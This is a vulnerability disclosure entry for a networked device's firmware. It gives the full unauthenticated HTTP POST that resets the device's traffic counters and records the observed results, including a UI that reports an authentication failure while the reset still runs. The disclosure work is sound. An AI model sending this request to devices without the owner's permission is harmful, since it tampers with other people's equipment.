# RC-0005 — PoC: unauthenticated statistics reset

**Policy:** the request below is the complete demonstration — one cookie-free
POST, captured during an authorized evidence run and reproduced twice. No
script is published during coordination because the request itself is
trivial and modifies volatile counters.

## The request

```http
POST /st_stats.php HTTP/1.1
Host: <device>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

act=x
```

- **No `Cookie` header, no credentials, no CSRF token.** Any nonempty `act`
  value selects the reset branch.

## Observed behavior (owned device, firmware 2.11DE B06)

| Step | Observation |
|---|---|
| Response | `HTTP 200` with body containing **`Authenticate(-1, 600)`** — the UI *renders an authentication failure* … |
| … but | … **while the reset was still performed**: all six displayed counters were zero afterwards |
| Follow-up | LAN counters resumed increasing; WAN and Wi-Fi stayed at zero until traffic resumed |
| UART | `resetstats` helper messages for `eth2.2` and `br0`; `ra0` counters dropped to zero |

The mismatch between the rendered error and the performed action is part of
the finding: the reset branch executes *before/independently of* the
authentication check whose failure message is shown.

## Reproduction policy

Replaying this against a device **you own** will clear its volatile traffic
counters (restorable by letting traffic flow / reboot). Do not run it
against devices without explicit permission.
